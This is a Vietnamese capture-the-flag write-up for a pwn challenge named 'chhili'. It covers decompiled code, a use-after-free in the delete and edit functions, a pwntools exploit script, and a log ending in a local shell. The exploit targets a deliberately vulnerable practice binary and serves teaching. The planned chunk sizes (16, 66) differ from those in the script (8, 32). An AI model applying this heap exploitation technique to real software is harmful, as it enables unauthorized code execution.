# Chhili
## Reverse
```sh
zir@ubuntu:~/fword$ file chhili
chhili: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c4dea7e3aee78d8ebe2eb75f64baba1c51a70e29, for GNU/Linux 3.2.0, not stripped

```
## Checksec
Bài này bật full các cơ chế bảo mật cơ bản.
```sh
pwndbg> checksec
[*] '/bin/dash'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

# Bug
### Thông qua IDA thì chương trình sẽ có 1 số hàm như sau:
* init()
* menu()
* create()
* delete()
* edit()
* get_shell()
* choice()
* main()

Pseudo code hàm create của file 
```sh
__int64 create()
{
  __int64 result; // rax
  _DWORD nbytes[3]; // [rsp+4h] [rbp-9Ch] BYREF
  char buf[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v3; // [rsp+98h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  *(_QWORD *)&nbytes[1] = malloc(0x10uLL);
  puts("size : ");
  printf(">> ");
  __isoc99_scanf("%d", nbytes);
  if ( nbytes[0] > 0 && nbytes[0] <= 127 )
  {
    LODWORD(mySize) = nbytes[0];
    puts("data : ");
    printf(">> ");
    read(0, buf, nbytes[0]);
    **(_QWORD **)&nbytes[1] = malloc(nbytes[0]);
    *(_QWORD *)(*(_QWORD *)&nbytes[1] + 8LL) = malloc(0x10uLL);
    strcpy(**(char ***)&nbytes[1], buf);
  }
  result = *(_QWORD *)&nbytes[1];
  myChunk = *(void **)&nbytes[1];
  return result;
}
```

Cấp phát 3 chunk với 2 chunk có kích thước cố định
```sh
myChunk -----> chunk1
                 |
                 -----> chunk2 (input size từ người dùng)
                 |
                 -----> chunk3 (giá trị == "admin" sẽ lấy được shell)
```
Đây là hàm gây ra lỗi UAF vì chỉ free myChunk nhưng không huỷ liên kết mà myChunk trỏ đến

```sh
void delete()
{
  if ( myChunk )
  {
    free(*(void **)myChunk);
    free(myChunk);
  }
}
```
Chỉnh sửa nội dung thông qua biến myChunk, nó có thể ghi đè lên địa chỉ mà myChunk trỏ tới lúc trước khi free và sau kh free

```sh
ssize_t edit()
{
  ssize_t result; // rax

  result = *(_QWORD *)myChunk;
  if ( *(_QWORD *)myChunk )
  {
    puts("data : ");
    printf(">> ");
    return read(0, *(void **)myChunk, (unsigned int)mySize);
  }
  return result;
}
```
Nếu Chunk thứ 3 == "admin" thì chương trình sẽ gọi shell

```sh
int get_shell()
{
  if ( !myChunk || !*((_QWORD *)myChunk + 1) )
    return puts("You don't have any role");
  if ( !strncmp(*((const char **)myChunk + 1), "admin", 5uLL) )
    return system("/bin/sh");
  return puts("You don't have the permission to get a shell");
}
```

## Mục tiêu của mình sẽ tập trung ghi dè được Chunk thứ 3 thành giá trị "admin"

## Solution
Thực hiện exploit theo tư tưởng sau
* create 1 chunk với size == 16
* free
* edit -> Nhập "admin"
* create 1 chunk với 1 size > 16, chọn size == 66
* get_shell

## Exploit

```python
from pwn import * 
s = process("./chhili")

# tao 1 chunk 
s.sendline("1")
s.sendline("8")
s.sendline("afdsfds")

# free no di
s.sendline("2")
# uaf thay doi data thanh admin
s.sendline("3")
s.send("admin\x00")

# tao 1 chunk moi voi phan admin la phan quyen khi dung uaf
s.sendline("1")
s.sendline("32")
s.sendline("aziristhebestChamp")

# get_shell
s.sendline("4")
```

Run file để lấy shell
```sh
zir@ubuntu:~/fword$ python solve_chhili.py
[+] Starting local process './chhili': pid 3928
[*] Switching to interactive mode
Select an action
(1) malloc
(2) free
(3) edit
(4) get shell
(5) exit
>> size : 
>> data : 
>> Select an action
(1) malloc
(2) free
(3) edit
(4) get shell
(5) exit
>> Select an action
(1) malloc
(2) free
(3) edit
(4) get shell
(5) exit
>> data : 
>> Select an action
(1) malloc
(2) free
(3) edit
(4) get shell
(5) exit
>> size : 
>> data : 
>> Select an action
(1) malloc
(2) free
(3) edit
(4) get shell
(5) exit
>> $ 
$ whoami
zir   <--- Get shell>
$  
```